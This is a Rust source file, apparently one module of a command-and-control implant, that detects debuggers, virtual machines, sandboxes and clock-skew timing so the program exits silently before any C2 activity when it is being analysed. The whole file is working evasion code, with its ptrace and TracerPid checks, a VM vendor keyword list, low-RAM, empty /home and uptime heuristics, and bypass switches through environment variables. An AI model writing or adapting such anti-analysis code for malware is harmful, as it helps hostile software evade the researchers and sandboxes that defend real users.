//! Anti-Analysis: Debugger, VM, and Sandbox Detection
//!
//! Detects hostile execution environments and exits silently
//! before any C2 activity begins. No panic, no log — just clean exit.
//!
//! Detection layers (configurable via env var NO_ANTI_ANALYSIS=1):
//! 1. Debugger detection (ptrace, /proc/self/status TracerPid)
//! 2. VM/hypervisor detection (DMI, systemd-detect-virt — skippable)
//! 3. Sandbox detection (very low RAM, no home dirs, zero uptime)
//! 4. Timing analysis (sleep acceleration by sandbox clock skew)

use std::time::{Duration, Instant};
use tracing::debug;

/// Check all detection layers. Calls std::process::exit(0) on detection.
/// Set env NO_ANTI_ANALYSIS=1 to skip all checks.
pub fn detect_hostile_environment() {
    if std::env::var("NO_ANTI_ANALYSIS").is_ok() {
        return;
    }
    if detect_debugger() { std::process::exit(0); }
    // VM detection is skippable — many legitimate cloud targets
    if std::env::var("ALLOW_VM").is_err() {
        if detect_vm() { std::process::exit(0); }
    }
    if detect_sandbox() { std::process::exit(0); }
    if detect_timing_anomaly() { std::process::exit(0); }
}

fn detect_debugger() -> bool {
    #[cfg(target_os = "linux")]
    {
        if let Ok(status) = std::fs::read_to_string("/proc/self/status") {
            for line in status.lines() {
                if line.starts_with("TracerPid:") {
                    if let Some(pid) = line.split_whitespace().nth(1) {
                        if pid != "0" {
                            debug!("Debugger detected: TracerPid={}", pid);
                            return true;
                        }
                    }
                }
            }
        }

        unsafe {
            let ret = libc::ptrace(libc::PTRACE_TRACEME, 0, 0, 0);
            if ret != 0 {
                debug!("Debugger detected: ptrace attach failed");
                return true;
            }
            // PTRACE_TRACEME sets the trace flag — no PTRACE_DETACH needed.
            // Calling DETACH on self (pid=0) is undefined behavior.
        }
    }

    #[cfg(not(target_os = "linux"))]
    {
        #[cfg(target_os = "macos")]
        {
            let mut info = std::mem::MaybeUninit::<libc::kinfo_proc>::uninit();
            let mut mib = [libc::CTL_KERN, libc::KERN_PROC, libc::KERN_PROC_PID, std::process::id() as i32];
            let mut size = std::mem::size_of::<libc::kinfo_proc>();
            unsafe {
                let ret = libc::sysctl(mib.as_mut_ptr(), 4, info.as_mut_ptr() as *mut libc::c_void, &mut size, std::ptr::null_mut(), 0);
                if ret == 0 {
                    let info = info.assume_init();
                    if info.kp_proc.p_flag & libc::P_TRACED != 0 {
                        debug!("Debugger detected: P_TRACED flag set");
                        return true;
                    }
                }
            }
        }
    }

    false
}

fn detect_vm() -> bool {
    #[cfg(target_os = "linux")]
    {
        if let Ok(dmi) = std::fs::read_to_string("/sys/class/dmi/id/product_name") {
            let dmi_lower = dmi.to_lowercase();
            for keyword in &["vmware", "virtualbox", "qemu", "kvm", "xen", "hyper-v", "virtual machine", "parallels", "bhyve"] {
                if dmi_lower.contains(keyword) { return true; }
            }
        }

        if let Ok(output) = std::process::Command::new("systemd-detect-virt").arg("--vm").output() {
            if output.status.success() && !output.stdout.is_empty() {
                let virt = String::from_utf8_lossy(&output.stdout).trim().to_string();
                if virt != "none" && !virt.is_empty() { return true; }
            }
        }
    }
    false
}

fn detect_sandbox() -> bool {
    #[cfg(target_os = "linux")]
    {
        if let Ok(meminfo) = std::fs::read_to_string("/proc/meminfo") {
            for line in meminfo.lines() {
                if line.starts_with("MemTotal:") {
                    if let Some(kb) = line.split_whitespace().nth(1).and_then(|s| s.parse::<u64>().ok()) {
                        if kb < 128_000 { debug!("Sandbox: very low RAM ({} kB)", kb); return true; }
                    }
                }
            }
        }

        if let Ok(entries) = std::fs::read_dir("/home") {
            let count = entries.filter_map(|e| e.ok()).filter(|e| e.file_type().map(|t| t.is_dir()).unwrap_or(false)).count();
            if count == 0 { debug!("Sandbox: no home dirs"); return true; }
        }

        if let Ok(uptime_str) = std::fs::read_to_string("/proc/uptime") {
            if let Some(secs) = uptime_str.split_whitespace().next().and_then(|s| s.parse::<f64>().ok()) {
                if secs < 60.0 { return true; }
            }
        }
    }
    false
}

fn detect_timing_anomaly() -> bool {
    let expected = Duration::from_millis(500);
    let start = Instant::now();
    std::thread::sleep(expected);
    let elapsed = start.elapsed();

    if elapsed < expected.mul_f64(0.7) { return true; }
    if elapsed > expected * 20 { return true; }

    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detect_debugger_does_not_panic() { let _ = detect_debugger(); }
    #[test]
    fn detect_vm_does_not_panic() { let _ = detect_vm(); }
    #[test]
    fn detect_sandbox_does_not_panic() { let _ = detect_sandbox(); }
    #[test]
    fn timing_check_completes() {
        let start = Instant::now();
        let _ = detect_timing_anomaly();
        assert!(start.elapsed() >= Duration::from_millis(450));
    }
}
